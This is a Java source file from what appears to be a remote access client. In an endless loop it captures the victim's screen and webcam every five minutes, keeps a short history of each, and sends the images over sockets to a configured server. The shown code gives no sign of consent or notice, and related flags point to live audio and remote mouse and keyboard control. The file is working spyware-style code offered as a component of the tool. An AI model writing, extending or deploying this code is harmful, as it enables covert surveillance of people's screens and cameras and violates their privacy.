package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:09
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import com.github.sarxos.webcam.Webcam;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.ScheduledFuture;

public class ImageComponents {
    // Screen & Webcam Variables
    public static boolean WEBCAM_LIVE = false;
    public static boolean SCREEN_LIVE = false;
    public static boolean AUDIO_USER_LIVE = false;
    public static boolean AUDIO_SERVER_LIVE = false;
    public static int HISTORY_LIMIT = 9;
    public static long HISTORY_EACH = 5 * 60_000;
    public static java.util.List<BufferedImage> SCREEN_HISTORY = new ArrayList<>();
    public static java.util.List<BufferedImage> WEBCAM_HISTORY = new ArrayList<>();
    public static ScheduledFuture<?> WEBCAM;
    public static ScheduledFuture<?> SCREEN;
    public static boolean LIVE_STOPPER = true;
    public static boolean SENDING = false;

    /**
     * Start Local History
     */
    public static void startHistory() {
        try {
            ControlComponents.ROBOT_INSTANCE = new Robot();
        } catch (Exception exception) {
            ControlComponents.ROBOT = false;
        }

        for (; ; ) {
            execHistoryUpdate();
        }
    }

    public static void execHistoryUpdate() {
        while (SENDING) {
            try {
                Thread.sleep(1000);
            } catch (Exception ignored) {
            }
            return;
        }
        SENDING = true;
        BufferedImage screen = getImage(0, false);
        if (screen != null) {
            SCREEN_HISTORY.add(screen);
            if (SCREEN_HISTORY.size() > HISTORY_LIMIT) {
                SCREEN_HISTORY.remove(0);
            }
            ConnectClient.msg("icon-screen");
            ConnectClient.EXECUTOR.schedule(() -> sendImage(9, screen), Connect.DELAY, Connect.DELAY_TYPE);
        }
        try {
            Thread.sleep(1000);
        } catch (InterruptedException ignored) {
        }
        BufferedImage webcam = getWebcam(0, WEBCAM_LIVE, false);
        if (webcam != null) {
            WEBCAM_HISTORY.add(webcam);
            if (WEBCAM_HISTORY.size() > HISTORY_LIMIT) {
                WEBCAM_HISTORY.remove(0);
            }
            ConnectClient.msg("icon-webcam");
            ConnectClient.EXECUTOR.schedule(() -> sendImage(10, webcam), Connect.DELAY, Connect.DELAY_TYPE);
        }
        SENDING = false;
        try {
            Thread.sleep(HISTORY_EACH);
        } catch (InterruptedException ignored) {
        }
    }

    /**
     * Create history image to server
     */
    public static BufferedImage createHistoryImage(java.util.List<BufferedImage> images) {
        int gridSize = 3;
        int imageWidth = 0;
        int imageHeight = 0;

        for (BufferedImage img : images) {
            if (img != null) {
                imageWidth = img.getWidth();
                imageHeight = img.getHeight();
                break;
            }
        }

        if (imageWidth == 0 || imageHeight == 0) {
            imageWidth = 100;
            imageHeight = 100;
        }

        while (images.size() < 9) {
            BufferedImage blackImage = new BufferedImage(imageWidth, imageHeight, BufferedImage.TYPE_INT_ARGB);
            Graphics2D gBlack = blackImage.createGraphics();
            gBlack.setColor(Color.BLACK);
            gBlack.fillRect(0, 0, imageWidth, imageHeight);
            gBlack.dispose();
            images.add(blackImage);
        }

        BufferedImage combinedImage = new BufferedImage(
                gridSize * imageWidth,
                gridSize * imageHeight,
                BufferedImage.TYPE_INT_ARGB
        );

        Graphics2D g = combinedImage.createGraphics();

        for (int row = 0; row < gridSize; row++) {
            for (int col = 0; col < gridSize; col++) {
                int index = row * gridSize + col;
                BufferedImage imgToDraw = images.get(index);
                g.drawImage(imgToDraw, col * imageWidth, row * imageHeight, null);
            }
        }

        g.dispose();
        return combinedImage;
    }

    public static void sendImage(int port, BufferedImage image) {
        try {
            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT + port);
                 OutputStream os = imageSocket.getOutputStream()) {
                ImageIO.write(image, "png", os);
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro ao enviar a imagem única para o servidor " + Connect.IP + ":" + (Connect.PORT + port) + "! (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }
            try {
                System.gc();
            } catch (Exception exception) {
                ConnectClient.msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                ConnectClient.exception(exception);
            }
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao enviar a imagem para o servidor! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

    public static BufferedImage getImage(int monitor, boolean debug) {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            if (screens.length < (monitor + 1)) {
                return null;
            }
            GraphicsDevice secondScreen = screens[monitor];
            DisplayMode dm = secondScreen.getDisplayMode();
            int screenWidth = dm.getWidth();
            int screenHeight = dm.getHeight();

            Rectangle screenBounds = secondScreen.getDefaultConfiguration().getBounds();
            BufferedImage screenshot = ControlComponents.ROBOT_INSTANCE.createScreenCapture(new Rectangle(screenBounds.x, screenBounds.y, screenWidth, screenHeight));

            Point mouseLocation = MouseInfo.getPointerInfo().getLocation();

            Graphics2D graphics = screenshot.createGraphics();
            graphics.setColor(Color.RED);
            int cursorSize = 10;
            graphics.drawLine(
                    (int) mouseLocation.getX() - cursorSize,
                    (int) mouseLocation.getY(),
                    (int) mouseLocation.getX() + cursorSize,
                    (int) mouseLocation.getY()
            );
            graphics.drawLine(
                    (int) mouseLocation.getX(),
                    (int) mouseLocation.getY() - cursorSize,
                    (int) mouseLocation.getX(),
                    (int) mouseLocation.getY() + cursorSize
            );
            graphics.dispose();
            return screenshot;
        } catch (Exception exception) {
            if (debug) {
                ConnectClient.msg("Ocorreu um erro ao pegar a imagem da tela do cliente! (" + exception.getMessage() + ")");
            }
            ConnectClient.exception(exception);
        }
        return null;
    }

    public static Webcam getWebcam(int webcam) {
        try {
            java.util.List<Webcam> webcamList = Webcam.getWebcams();
            if (webcamList.size() < (webcam + 1)) {
                return null;
            }
            return webcamList.get(webcam);
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao pegar a webcam do cliente! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
            return null;
        }
    }

    public static BufferedImage getWebcam(int webcam, boolean keepOpen, boolean debug) {
        try {
            Webcam selected = getWebcam(webcam);
            if (selected == null) {
                return null;
            }
            if (!selected.isOpen()) {
                selected.open();
            }
            ProcessComponents.LAST_ID = webcam;
            BufferedImage image = selected.getImage();
            if (!keepOpen) {
                selected.close();
            }
            return image;
        } catch (Exception exception) {
            if (debug) {
                ConnectClient.msg("Ocorreu um erro ao abrir a webcam do cliente! (" + exception.getMessage() + ")");
            }
            ConnectClient.exception(exception);
        }
        return null;
    }
}
